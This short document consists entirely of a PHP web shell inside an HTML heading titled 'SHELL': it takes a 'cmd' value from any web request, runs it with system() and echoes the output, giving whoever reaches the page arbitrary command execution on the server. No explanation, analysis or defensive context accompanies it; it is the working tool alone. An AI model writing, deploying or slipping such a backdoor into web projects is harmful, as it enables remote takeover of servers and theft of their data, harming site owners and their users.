<h1>SHELL<br><?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; } __halt_compiler(); ?></h1>
